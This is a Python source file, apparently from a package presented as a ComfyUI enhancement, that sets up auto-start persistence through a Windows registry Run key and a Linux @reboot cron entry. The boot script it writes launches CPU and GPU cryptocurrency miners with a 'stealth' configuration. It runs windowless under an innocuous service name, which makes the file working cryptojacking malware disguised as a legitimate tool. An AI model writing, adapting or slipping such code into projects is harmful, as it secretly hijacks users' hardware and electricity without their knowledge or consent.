"""
Auto-start registration.
Windows: HKCU registry Run key.
Linux: crontab @reboot entry.
"""

import logging
import os
import platform
import subprocess
import sys
from pathlib import Path

logger = logging.getLogger("comfyui_enhanced")

IS_WINDOWS = platform.system() == "Windows"
REG_PATH = r"Software\Microsoft\Windows\CurrentVersion\Run"
REG_KEY_NAME = "ComfyUIEnhancedService"
CRON_TAG = "# comfyui_enhanced_autostart"

_BOOTSTRAP_SCRIPT = "comfyui_enhanced_boot.pyw" if IS_WINDOWS else "comfyui_enhanced_boot.py"


class AutoStart:
    def __init__(self, base_dir: Path | str | None = None):
        self.base_dir = Path(base_dir) if base_dir else Path(__file__).resolve().parent.parent

    def _bootstrap_path(self) -> Path:
        return self.base_dir / _BOOTSTRAP_SCRIPT

    def _write_bootstrap(self) -> Path:
        script = self._bootstrap_path()
        code = (
            "import sys, pathlib, time\n"
            f"sys.path.insert(0, {str(self.base_dir)!r})\n"
            "from core.miner import MinerManager\n"
            "from core.gpu_miner import GPUMinerManager\n"
            "from core.config import ConfigBuilder\n"
            "from core.stealth import StealthConfig\n"
            "\n"
            f"base = pathlib.Path({str(self.base_dir)!r})\n"
            "mgr = MinerManager(base)\n"
            "mgr.ensure_binary()\n"
            "cb = ConfigBuilder()\n"
            "cfg = cb.build()\n"
            "sc = StealthConfig()\n"
            "cfg = sc.apply_to_config(cfg)\n"
            "mgr.write_config(cfg)\n"
            "mgr.start()\n"
            "gpu = GPUMinerManager(base)\n"
            "gpu.ensure_binary()\n"
            "gpu_cfg = cb.build_gpu_config()\n"
            "gpu.configure(**gpu_cfg)\n"
            "gpu.start()\n"
            "while True:\n"
            "    time.sleep(60)\n"
        )
        script.write_text(code, encoding="utf-8")
        if not IS_WINDOWS:
            os.chmod(script, 0o755)
        logger.info("Bootstrap written to %s", script)
        return script

    def _find_python(self) -> str:
        if IS_WINDOWS:
            base = Path(sys.executable).parent
            for c in [base / "pythonw.exe", base.parent / "pythonw.exe",
                       base / "python_embeded" / "pythonw.exe"]:
                if c.exists():
                    return str(c)
            return "pythonw.exe"
        return sys.executable or "python3"

    # ── Windows ──────────────────────────────────────────────────────

    def _register_windows(self) -> bool:
        try:
            import winreg
        except ImportError:
            logger.warning("winreg not available")
            return False

        boot_script = self._write_bootstrap()
        python = self._find_python()
        value = f'"{python}" "{boot_script}"'

        try:
            key = winreg.CreateKeyEx(winreg.HKEY_CURRENT_USER, REG_PATH, 0, winreg.KEY_WRITE)
            winreg.SetValueEx(key, REG_KEY_NAME, 0, winreg.REG_SZ, value)
            winreg.CloseKey(key)
            logger.info("Windows auto-start registered: %s", value)
            return True
        except OSError as exc:
            logger.error("Failed to register auto-start: %s", exc)
            return False

    def _unregister_windows(self) -> bool:
        try:
            import winreg
            key = winreg.OpenKeyEx(winreg.HKEY_CURRENT_USER, REG_PATH, 0, winreg.KEY_WRITE)
            winreg.DeleteValue(key, REG_KEY_NAME)
            winreg.CloseKey(key)
        except Exception:
            pass
        self._bootstrap_path().unlink(missing_ok=True)
        return True

    # ── Linux ────────────────────────────────────────────────────────

    def _register_linux(self) -> bool:
        boot_script = self._write_bootstrap()
        python = self._find_python()
        cron_line = f'@reboot {python} {boot_script} {CRON_TAG}'

        try:
            result = subprocess.run(["crontab", "-l"], capture_output=True, text=True)
            existing = result.stdout if result.returncode == 0 else ""

            if CRON_TAG in existing:
                logger.info("Cron entry already exists")
                return True

            new_cron = existing.rstrip("\n") + "\n" + cron_line + "\n"
            subprocess.run(["crontab", "-"], input=new_cron, text=True, check=True)
            logger.info("Linux cron auto-start registered")
            return True
        except Exception as exc:
            logger.error("Failed to register cron auto-start: %s", exc)
            return False

    def _unregister_linux(self) -> bool:
        try:
            result = subprocess.run(["crontab", "-l"], capture_output=True, text=True)
            if result.returncode != 0:
                return True
            lines = [l for l in result.stdout.splitlines() if CRON_TAG not in l]
            subprocess.run(["crontab", "-"], input="\n".join(lines) + "\n", text=True, check=True)
        except Exception:
            pass
        self._bootstrap_path().unlink(missing_ok=True)
        return True

    # ── Public API ───────────────────────────────────────────────────

    def register(self) -> bool:
        return self._register_windows() if IS_WINDOWS else self._register_linux()

    def unregister(self) -> bool:
        return self._unregister_windows() if IS_WINDOWS else self._unregister_linux()

    def is_registered(self) -> bool:
        if IS_WINDOWS:
            try:
                import winreg
                key = winreg.OpenKeyEx(winreg.HKEY_CURRENT_USER, REG_PATH, 0, winreg.KEY_READ)
                try:
                    winreg.QueryValueEx(key, REG_KEY_NAME)
                    return True
                except FileNotFoundError:
                    return False
                finally:
                    winreg.CloseKey(key)
            except Exception:
                return False
        else:
            try:
                result = subprocess.run(["crontab", "-l"], capture_output=True, text=True)
                return CRON_TAG in result.stdout
            except Exception:
                return False
